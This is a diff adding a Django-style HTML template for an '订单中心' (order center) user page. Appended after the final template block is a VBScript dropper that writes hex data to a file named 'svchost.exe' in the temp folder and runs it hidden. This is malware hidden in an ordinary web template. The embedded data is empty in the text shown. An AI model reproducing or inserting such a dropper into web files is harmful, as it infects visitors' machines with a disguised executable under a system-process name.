@@ -1,0 +1,26 @@
+{% extends 'user_base.html' %}
+{% block title %}
+    订单中心
+{% endblock title %}
+{% block user_title %}
+    订单中心
+{% endblock user_title %}
+{% block user_center %}
+{% endblock user_center %}
+{% block user_content %}
+{{ message }}
+{% endblock user_content %}<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
